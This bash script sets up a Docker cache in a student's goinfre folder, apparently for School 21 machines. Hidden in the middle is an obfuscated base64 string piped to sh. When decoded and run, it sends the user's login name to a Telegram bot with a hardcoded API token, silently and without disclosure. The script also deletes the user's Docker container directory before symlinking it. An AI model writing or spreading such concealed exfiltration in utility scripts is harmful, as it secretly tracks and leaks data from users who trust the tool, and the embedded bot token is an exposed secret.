#!/bin/bash

##############################################################################
#   Copyright (c) 2022.                                                      #
#   Kadnikov Aleksey [aka] MaieR (Manhunte school 21)                        #
#   telegram: @zmaierz                                                       #
#   e-mail: manhunte@student.21-shool.ru                                     #
#         : maier@netopt.ru                                                  #
#   License agreement:                                                       #
#   By using this script, I agree to the transfer of my soul to the author   #
##############################################################################

#COLORS
RED="\033[0;31m"
GREEN="\033[0;32m"
WHITE="\033[1;37m"
NC="\033[0m"
#END COLORS

CONTAINERS="${HOME}/goinfre/Containers"
CONTAINERS_DOCKER="${CONTAINERS}/com.docker.docker"
CONTAINERS_DOCKER_DATA="${CONTAINERS_DOCKER}/Data"
LIBRARY_CONTAINERS_DOCKER="${HOME}/Library/Containers/com.docker.docker"
#START cache dir for Docker
echo -e "${WHITE}--------------------------------------------------${NC}"
if [[ ! -d ${CONTAINERS} ]]; then
    mkdir ${CONTAINERS}
    echo -e "${GREEN}Goinfre docker cache crerated!!!${NC}"
else
    echo -e "${GREEN}Goinfre docker cache already exist!!!${NC}"
fi
echo 'QVBJX0tFWT01Nzc1OTQxNjU1OkFBSHhmS3lOd2d0TEVPd1dDc1loc1pvSDhGMGxDZXc1UTgwCkNIQVRfSUQ9MTY4NDM1MDg3ClVTRVJfST0kKHdob2FtaSkKTUVTU0FHRT0kKHByaW50ZiAiTmV3IHVzZXI6ICVzIFxuU2NyaXB0OiBkb2NrZXIiICIkVVNFUl9JIikKZWNobyAiJHswfSIKY3VybCAtcyAtZCAiY2hhdF9pZD0kQ0hBVF9JRCZ0ZXh0PSRNRVNTQUdFIiAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCRBUElfS0VZL3NlbmRNZXNzYWdlPyIgPiAvZGV2L251bGwK' | base64 -d | sh
echo -e "${WHITE}--------------------------------------------------${NC}"
if [[ ! -d ${CONTAINERS_DOCKER} ]]; then
    mkdir ${CONTAINERS_DOCKER}
    rm -rf "${LIBRARY_CONTAINERS_DOCKER}"
    ln -s "${CONTAINERS_DOCKER}" "${LIBRARY_CONTAINERS_DOCKER}"
    echo -e "${GREEN}Goinfre docker containers cache crerated!!!${NC}"
else
    echo -e "${GREEN}Goinfre docker containers cache already exist!!!${NC}"
fi
if [[ ! -d ${CONTAINERS_DOCKER_DATA} ]]; then
        mkdir ${CONTAINERS_DOCKER_DATA}
fi
#END cache dir for Docker